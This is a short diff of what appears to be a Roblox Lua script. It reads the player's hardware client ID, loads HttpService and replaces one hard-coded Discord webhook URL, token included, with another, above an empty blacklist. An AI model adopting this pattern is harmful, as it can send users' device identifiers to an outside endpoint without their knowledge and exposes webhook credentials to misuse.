@@ -8,7 +8,7 @@ print("A")
 
 local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 HttpService = game:GetService("HttpService")
-Webhook_URLme = "https://discord.com/api/webhooks/1084344739043741796/oYB3V3dkFDIutTN_i2L_N2uwBo6nq1IHuYCBwEmTZoBzjmzO3C7jKNrip2uvJY1kyzAM"
+Webhook_URLme = "https://discord.com/api/webhooks/1096536364431974410/SkpQk5OmzDUUVjnHkJ0Zd5fqyiBHT2WT32VjT-BetcKdIN-DowJuBp-Fre5iuDah3VYR"
 local blacklist = {
     
 }
